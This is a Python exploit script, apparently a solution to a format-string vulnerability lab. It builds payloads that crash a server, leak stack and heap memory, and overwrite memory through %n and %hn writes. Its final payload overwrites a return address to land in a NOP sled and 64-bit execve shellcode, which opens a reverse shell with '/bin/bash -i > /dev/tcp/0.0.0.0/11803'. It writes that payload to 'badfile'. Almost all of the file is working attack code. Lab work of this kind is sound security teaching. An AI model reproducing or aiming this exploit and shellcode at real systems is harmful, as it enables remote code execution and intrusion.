#!/usr/bin/python3
"""
    https://julianor.tripod.com/bc/alpha-fmtstr.txt
"""
import sys

N = 1500

buffer_addr = 0x00007fffffffdfa0
jmp_len     = 0x100
secret_addr = 0x0000555555556008
target_addr = 0x0000555555558048
ret_ip_addr = 0x00007fffffffde30 + 0x8

# Task1: Crashing the Program
# s = "%n" * 30 + "\n"
# payload = s.encode('latin1')

# Task2: Printing Out the Server Program’s Memory
#     A: Stack Data
# payload = ('@@@@@@@@').encode('latin1')
# s = "%.16lx|" * 150 + "\n"
# payload = s.encode('latin1')
#     B: Heap Data
# payload = ("%57$s   ").encode('latin1') + \
#           secret_addr.to_bytes(8, byteorder='little')

# Task3: Modifying the Server Program’s Memory
# 13124 = 0x3344
# 8738  = 0x2222
# len = 13 + 12 * 3 = 49 => 56 = 7 * 8
# payload = ("%13124x%63$hn" + "%8738x%64$hn").encode('latin1') + \
#           ("%8738x%65$hn" + "%8738x%66$hn       ").encode('latin1') + \
#           (target_addr + 6).to_bytes(8, byteorder='little') + \
#           (target_addr + 4).to_bytes(8, byteorder='little') + \
#           (target_addr + 2).to_bytes(8, byteorder='little') + \
#           (target_addr).to_bytes(8, byteorder='little')

# Task 4: Inject Malicious Code into the Server Program
shellcode_64 = (
   "\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48"
   "\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48"
   "\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31"
   "\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff"
   "/bin/bash*"
   "-c*"
   # "/bin/ls -l; echo '===== Success! ======'                  *"   # should be 59 chars
   "/bin/bash -i > /dev/tcp/0.0.0.0/11803 0<&1 2>&1           *"
   "AAAAAAAA"   # Placeholder for argv[0] --> "/bin/bash"
   "BBBBBBBB"   # Placeholder for argv[1] --> "-c"
   "CCCCCCCC"   # Placeholder for argv[2] --> the command string
   "DDDDDDDD"   # Placeholder for argv[3] --> NULL
).encode('latin-1')

# The format string to modify the memory
# buffer_addr + jmp_len = 0x00007fffffffdfa0 + 0x100 = 0x00007fffffffe0a0
# bytes1 = ((buffer_addr + jmp_len) & 0xffff000000000000) >> 48
# bytes2 = ((buffer_addr + jmp_len) & 0x0000ffff00000000) >> 32
# bytes3 = ((buffer_addr + jmp_len) & 0x00000000ffff0000) >> 16
# bytes4 = ((buffer_addr + jmp_len) & 0x000000000000ffff)
# offset1 = 0x0000           = 0x0000
# offset2 = 0x7fff - 0x0000  = 0x7fff = 32767
# offset3 = 0xffff - 0x7fff  = 0x8000 = 32768
# offset4 = 0x1e0a0 - 0xffff = 0xe0a1 = 57505
# len = 6 + 14 * 3 = 48 = 6 * 8
fmt_str = "%62$hn" + \
          "%.32767x%63$hn" + \
          "%.32768x%64$hn" + \
          "%.57505x%65$hn"
payload = (fmt_str).encode('latin-1') + \
          (ret_ip_addr + 6).to_bytes(8, byteorder='little') + \
          (ret_ip_addr + 4).to_bytes(8, byteorder='little') + \
          (ret_ip_addr + 2).to_bytes(8, byteorder='little') + \
          (ret_ip_addr).to_bytes(8, byteorder='little')

# The slide code(NOPS) and shellcode
payload += bytearray(0x90 for _ in range(N - len(payload) - len(shellcode_64)))
payload += shellcode_64

# Write the content to badfile
with open('badfile', 'wb') as f:
    f.write(payload)
